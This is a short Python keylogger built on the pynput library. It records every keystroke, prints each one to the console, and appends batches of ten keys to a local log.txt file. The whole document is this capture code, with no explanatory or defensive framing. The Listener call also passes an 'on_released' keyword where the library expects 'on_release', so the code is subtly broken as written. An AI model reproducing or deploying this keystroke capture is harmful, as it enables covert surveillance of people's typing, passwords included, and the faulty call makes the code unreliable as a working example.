import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print(f"{key} pressed")
    if count >= 10:
        count = 0
        write_file(keys)
        print(keys)
        keys = []


def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            f.write(str(key))

def on_released(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_released = on_released) as listener:
    listener.join()